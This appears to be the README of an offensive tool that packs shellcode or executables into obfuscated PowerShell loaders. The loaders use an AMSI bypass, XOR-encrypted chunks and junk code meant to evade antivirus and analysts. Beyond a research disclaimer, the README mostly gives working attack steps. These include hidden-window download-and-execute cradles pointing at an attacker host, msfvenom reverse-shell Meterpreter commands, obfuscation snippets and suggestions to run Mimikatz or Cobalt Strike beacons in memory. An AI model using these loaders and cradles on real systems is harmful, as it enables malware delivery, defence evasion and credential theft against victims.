# AdaptixPowerShell - Advanced PowerShell Payload Obfuscator

An advanced PowerShell payload generator with Chimera-style obfuscation, XOR encryption, and aggressive anti-detection techniques.

## ⚠️ DISCLAIMER

**THIS PROJECT IS INTENDED FOR EDUCATIONAL PURPOSES AND SECURITY RESEARCH ONLY**

This tool is designed for:
- **Security research and study**: Understanding obfuscation techniques and payload delivery mechanisms
- **Enhancing detection capabilities**: Helping blue teams and security researchers improve their detection rules and defensive strategies
- **Authorized penetration testing**: Only in controlled environments with explicit written permission

### Important Requirements:
- ✅ **MUST** be used only in controlled, isolated laboratory environments
- ✅ **MUST** have explicit written authorization before testing on any system
- ✅ **MUST NOT** be used for unauthorized access or malicious purposes
- ⚠️ Unauthorized access to computer systems is **illegal** and may result in severe legal consequences

The authors and contributors assume **NO LIABILITY** for misuse, damage, or illegal activities conducted with this tool. By using this software, you agree to use it responsibly and in accordance with all applicable laws and regulations.

---

## Features

### 🚀 NEW: EXE to Shellcode Conversion
- **Direct .exe/.dll to shellcode conversion** using [Donut](https://github.com/TheWover/donut)
- No need to manually generate raw shellcode
- Supports x86, x64, and dual-mode (x86+x64) architectures
- Built-in AMSI/WLDP bypass options
- Pass command-line parameters to the executable
- Automatic detection of PE files

### 🎭 Chimera-Style Obfuscation
- AMSI bypass string chunking
- `System.Management.Automation` string obfuscation
- `amsiInitFailed` field name obfuscation
- Random variable names (15-25 characters)
- Dead code insertion (junk code between variables)
- Random indentation
- Backtick injection in cmdlets

### 🔐 Payload Encryption & Chunking
- XOR encryption of shellcode
- Encrypted payload split into 2-5 chunks
- Random variable names for each chunk
- Runtime concatenation before decryption

### 🛡️ C# P/Invoke Obfuscation
- `kernel32.dll` split into 4 random const strings
- Random class names (replaces `Win32`)
- Random method names (replaces `VirtualAlloc`)
- Random delegate names (replaces `ShellcodeDelegate`)
- EntryPoint remapping



## Installation

```bash
git clone <repository-url>
cd hostpayload

# Install required dependencies (donut-shellcode)
pip3 install -r requirements.txt

# Make script executable
chmod +x adaptixpowerShell.py
```

**Note:** The `donut-shellcode` Python package is required for .exe to shellcode conversion. If you only plan to use raw shellcode (.bin files), you can skip installing requirements.

## Usage

### Basic Usage

```bash
# Generate obfuscated payload from raw shellcode (default level 3)
python3 adaptixpowerShell.py shellcode.bin

# Generate payload from .exe file (auto-converts to shellcode)
python3 adaptixpowerShell.py payload.exe -l 4

# Generate payload from .exe with command line parameters
python3 adaptixpowerShell.py payload.exe -p "arg1 arg2" -l 5

# Specify target architecture for .exe conversion
python3 adaptixpowerShell.py payload.exe --arch 2  # x64 only

# Specify obfuscation level (1-5)
python3 adaptixpowerShell.py shellcode.bin -l 4

# Enable debug mode
python3 adaptixpowerShell.py shellcode.bin -d

# Disable obfuscation
python3 adaptixpowerShell.py shellcode.bin --no-obfuscate
```

### Obfuscation Levels

- **Level 1**: Low obfuscation, faster execution
- **Level 2**: Medium obfuscation
- **Level 3**: High obfuscation (default)
- **Level 4**: Higher obfuscation
- **Level 5**: Maximum obfuscation

### Output

The script generates three delivery methods:

1. **Direct Download**:
   ```powershell
   powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/payload.ps1')"
   ```

2. **Base64 Encoded**:
   ```powershell
   powershell -nop -w hidden -enc <base64_string>
   ```

3. **PowerShell File**: `<random>.ps1`

## Examples

### Example 1: Convert .exe to Obfuscated PowerShell Payload

```bash
# Use any .exe file (Cobalt Strike beacon, custom implant, etc.)
python3 adaptixpowerShell.py beacon.exe -l 4

# Start web server
python3 -m http.server 80

# Execute on target
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
```

### Example 2: Convert .exe with Command Line Parameters

```bash
# Pass parameters that will be given to the executable at runtime
python3 adaptixpowerShell.py myapp.exe -p "--config C:\temp\config.ini --verbose" -l 5

# The parameters will be passed to myapp.exe when it runs in memory
```

### Example 3: Generate Meterpreter Payload (Traditional Method)

```bash
# Generate raw shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  EXITFUNC=thread -f raw -o shell.bin

# Obfuscate with AdaptixPowerShell
python3 adaptixpowerShell.py shell.bin -l 4

# Start web server
python3 -m http.server 80

# Execute on target
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
```

### Example 4: Target Specific Architecture

```bash
# Generate x64-only payload from .exe
python3 adaptixpowerShell.py payload.exe --arch 2 -l 4

# Generate x86-only payload from .exe
python3 adaptixpowerShell.py payload.exe --arch 1 -l 4

# Generate dual-mode payload (x86+x64) - DEFAULT
python3 adaptixpowerShell.py payload.exe --arch 3 -l 4
```

### Debug Mode

Use debug mode to verify decryption is working:

```bash
python3 adaptixpowerShell.py shellcode.bin -d
```



## How It Works

### Workflow for .exe Files (NEW)

1. **Donut Conversion**: Converts .exe/.dll to position-independent shellcode
   - Supports .NET assemblies, native PE files, VBS/JS scripts
   - Includes built-in AMSI/WLDP bypass
   - Creates a loader stub that reconstructs the PE in memory
2. **AMSI Bypass**: Disables AMSI using reflection to access `amsiInitFailed` field
3. **Encryption**: XOR encrypts the shellcode with a random 16-byte key
4. **Chunking**: Splits encrypted payload into multiple variables
5. **Obfuscation**: Applies Chimera-style obfuscation techniques
6. **Dead Code**: Inserts junk code between variables to hinder human analysis
7. **Decryption**: PowerShell decrypts XOR payload at runtime
8. **Injection**: Uses `VirtualAlloc` + `Marshal.Copy` for in-memory execution

### Workflow for Raw Shellcode (.bin Files)

1. **AMSI Bypass**: Disables AMSI using reflection to access `amsiInitFailed` field
2. **Encryption**: XOR encrypts the shellcode with a random 16-byte key
3. **Chunking**: Splits encrypted payload into multiple variables
4. **Obfuscation**: Applies Chimera-style obfuscation techniques
5. **Dead Code**: Inserts junk code between variables to hinder human analysis
6. **Decryption**: PowerShell decrypts XOR payload at runtime
7. **Injection**: Uses `VirtualAlloc` + `Marshal.Copy` for in-memory execution

## Donut Integration

This tool integrates [Donut](https://github.com/TheWover/donut) - a shellcode generation tool that creates position-independent shellcode payloads from .NET Assemblies, native EXEs/DLLs, VBS/JS/XSL scripts.

### What is Donut?

Donut is a shellcode generation tool that allows you to convert executables into shellcode that can be executed from memory. It:

- Generates position-independent shellcode from EXE/DLL files
- Supports both .NET assemblies and native PE files
- Includes built-in AMSI and WLDP bypass capabilities
- Allows passing command-line parameters to the executable
- Works on x86, x64, and dual-mode architectures

### Donut Options

| Option | Values | Description |
|--------|--------|-------------|
| `-a, --arch` | 1=x86, 2=amd64, 3=x86+amd64 | Target architecture (default: 3) |
| `-b, --bypass` | 1=none, 2=abort, 3=continue | AMSI/WLDP bypass behavior (default: 3) |
| `-p, --params` | string | Command line parameters for the executable |

### Example Use Cases

1. **Cobalt Strike Beacon**: Convert beacon.exe to shellcode
2. **Custom C# Tools**: Execute .NET assemblies in memory
3. **Mimikatz**: Run mimikatz.exe without touching disk
4. **Any Windows PE**: Convert any .exe to injectable shellcode

### Detailed Guide

For comprehensive donut usage examples and advanced configurations, see [DONUT_GUIDE.md](DONUT_GUIDE.md)

## Obfuscation Techniques

### String Chunking
```powershell
# Before
$dll = "kernel32.dll"

# After
$vKudKDAuMJHv = "ker"
$DOOqHAdQjVXYBFc = "nel"
$knbATApFWUpN = "32."
$hNverCTTZdykJ = "dll"
$dll = $vKudKDAuMJHv + $DOOqHAdQjVXYBFc + $knbATApFWUpN + $hNverCTTZdykJ
```

### Payload Chunking
```powershell
[Byte[]] $chunk1 = 0x62,0xBE,0x41,0xB7...
[Byte[]] $chunk2 = 0xF7,0xF5,0xBB,0x2D...
[Byte[]] $chunk3 = 0x4D,0x90,0xF7,0x58...
[Byte[]] $encrypted = $chunk1 + $chunk2 + $chunk3
```

### Dead Code Insertion (Anti-Human Analysis)
```powershell
# Real code mixed with junk code
$realVariable = "important"
Get-Random -Min 1 -Max 100 | Out-Null  # Dead code (unused)
$junkVar = 'randomString'              # Dead code (unused)
[Math]::Abs(-500) | Out-Null           # Dead code (unused)
$anotherReal = "value"
if ($undefined -eq $null) { $x = 5 }   # Dead code (never executes)
$env:COMPUTERNAME | Out-Null           # Dead code (unused)
```

**10 Types of Dead Code:**
1. Meaningless variable assignments
2. Math operations with unused results  
3. Conditionals that never execute
4. String operations with unused results
5. Environment variable checks (unused)
6. Timestamp operations (unused)
7. Random number generation (unused)
8. Type checks (unused)
9. Process checks (unused)
10. Commented debugging code

**Important Notes:**
- Dead code is intelligently inserted between PowerShell lines
- Scales with obfuscation level (20% at level 1, up to 40% at level 5)
- Zero performance impact - all junk piped to `Out-Null` or never executes
- Makes manual analysis harder for security researchers

### C# Class Obfuscation
```csharp
// Before
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(...);
}

// After
private const string vKudKDAuMJHv = "ker";
private const string DOOqHAdQjVXYBFc = "nel";
private const string knbATApFWUpN = "32.";
private const string hNverCTTZdykJ = "dll";

public class UwZtTEjJflziJLL {
    [DllImport(vKudKDAuMJHv + DOOqHAdQjVXYBFc + knbATApFWUpN + hNverCTTZdykJ, EntryPoint = "VirtualAlloc")]
    public static extern IntPtr nTUEhCagiLrPlou(...);
}
```

## Detection Evasion

### ✅ Bypassed/Obfuscated
- Static signature detection
- String-based AV signatures
- Hash-based detection (different each run)
- AMSI (bypassed)
- Simple obfuscation detection

### ⚠️ Still Detectable
- Behavioral analysis (memory allocation patterns)
- Advanced EDR with behavioral heuristics
- Network-based IDS/IPS (for download cradles)
- ETW (Event Tracing for Windows)

## Testing

Always test your payloads in a controlled environment:

```bash
# Create test shellcode (NOP sled)
python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 8)" > test.bin

# Generate payload
python3 adaptixpowerShell.py test.bin -l 3 -d

# Test execution (should not crash)
powershell -ExecutionPolicy Bypass -File generated_payload.ps1
```

## Troubleshooting

### Large Executable Files (IMPORTANT!)

**⚠️ Payload Size Limitations:**

Large executables (> 1 MB) may produce PowerShell payloads that are too large to execute reliably:

| Executable Size | Payload Size | Status |
|----------------|--------------|---------|
| < 100 KB | ~500 KB | ✅ Reliable |
| 100-500 KB | 1-3 MB | ✅ Good |
| 500 KB - 1 MB | 3-5 MB | ⚠️ Marginal |
| 1+ MB (e.g., putty.exe) | 8+ MB | ❌ Problematic |

**Problem:** PowerShell hex encoding inflates shellcode size by ~5x, causing:
- Memory allocation failures
- Download timeouts
- Execution hangs/crashes
- EDR/AV detection

**Solutions for large executables:**

1. **Use smaller alternatives** (BEST)
   ```bash
   # Don't convert full GUI apps
   # Use purpose-built payloads/beacons instead
   ```

2. **Use msfvenom shellcode** instead
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=192.168.1.100 LPORT=443 -f raw -o shell.bin
   python3 adaptixpowerShell.py shell.bin -l 3
   # Result: ~300 KB payload vs 8+ MB
   ```

3. **Reduce settings**
   ```bash
   # x64 only + minimal obfuscation
   python3 adaptixpowerShell.py large.exe --arch 2 -l 1
   ```

**See [TROUBLESHOOTING_LARGE_PAYLOADS.md](TROUBLESHOOTING_LARGE_PAYLOADS.md) for detailed solutions.**

### Donut Module Not Found

If you get an error about donut not being installed:

```bash
# Install donut-shellcode
pip3 install donut-shellcode

# Or install from requirements.txt
pip3 install -r requirements.txt
```

### Donut Manual Installation

If pip installation fails, you can install donut manually:

```bash
git clone https://github.com/TheWover/donut
cd donut
pip3 install .
```

### Testing Donut Conversion

To verify donut is working correctly:

```bash
# Use a SMALL test file (< 100 KB recommended)
python3 adaptixpowerShell.py small_test.exe -l 3 -d

# Check output for "Converting test.exe to shellcode using donut..."
# Verify payload size is reasonable (< 2 MB)
ls -lh *.ps1
```

### Architecture Compatibility

- Use `--arch 3` (default) for maximum compatibility (x86+x64)
- Use `--arch 2` for x64-only targets (smaller payload size)
- Use `--arch 1` for x86-only targets (legacy systems)


## Credits

Inspired by:
- [Chimera](https://github.com/tokyoneon/Chimera) - PowerShell obfuscation
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) - Obfuscation techniques

## License

This project is provided "as-is" for educational and research purposes. Use responsibly and only in controlled environments or on systems you own or have explicit written permission to test.

---

**Note**: This tool generates payloads that may be flagged by antivirus and EDR software. Always test in isolated, controlled environments and obtain proper authorization before any security assessment.
